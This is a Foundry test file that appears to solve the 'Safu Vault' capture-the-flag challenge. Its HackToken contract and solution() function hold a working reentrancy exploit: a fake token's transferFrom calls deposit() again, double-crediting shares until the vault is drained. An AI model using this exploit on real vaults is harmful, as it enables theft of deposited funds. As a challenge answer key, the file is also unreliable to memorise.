// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
import {SafuVault, IStrategy} from "src/safu-vault/SafuVault.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    Token usdc;
    SafuVault safuVault;
    SafuStrategy safuStrategy;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        usdc = new Token("USDC", "USDC");

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = attacker;
        addresses[1] = adminUser;
        amounts[0] = 10_000e18;
        amounts[1] = 10_000e18;

        // attacker gets 10_000 USDC as starting funds
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        safuStrategy = new SafuStrategy(address(usdc));
        vm.prank(admin);
        safuVault = new SafuVault(
            IStrategy(address(safuStrategy)),
            "LP Token",
            "LP"
        );

        vm.prank(admin);
        safuStrategy.setVault(address(safuVault));

        // other user deposits 10_000 USDC into the safu yield vault
        vm.prank(adminUser);
        usdc.approve(address(safuVault), type(uint).max);
        vm.prank(adminUser);
        safuVault.depositAll();
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        // implement solution here

        solution();

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker drains >= 90% of funds
        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault)) +
            usdc.balanceOf(address(safuStrategy));
        assertLe(totalVaultFunds, 1_000e18);
        assertGe(usdc.balanceOf(attacker), 19_000e18);
    }

    function solution() public {
        HackToken hack = new HackToken(safuVault);
        usdc.transfer(address(hack), usdc.balanceOf(attacker));
        hack.hack(10000 ether);
    }
}

contract HackToken {
    SafuVault private s_victim;
    address private s_owner;

    constructor(SafuVault _victim) {
        s_owner = msg.sender;
        s_victim = _victim;
    }

    function hack(uint256 amount) public {
        uint256 target = (s_victim.balance() * 19) / 10;
        s_victim.want().approve(address(s_victim), type(uint).max);
        while (true) {
            uint256 startingBalance = s_victim.want().balanceOf(address(this));
            console.log("Starting balance: ", startingBalance);

            if (startingBalance > target) {
                break;
            }

            s_victim.depositFor(address(this), amount, address(this));
            s_victim.withdrawAll();
        }

        s_victim.want().transfer(
            s_owner,
            s_victim.want().balanceOf(address(this))
        );
    }

    function transferFrom(
        address,
        address,
        uint256 amount
    ) external returns (bool) {
        s_victim.deposit(amount);
        return true;
    }
}
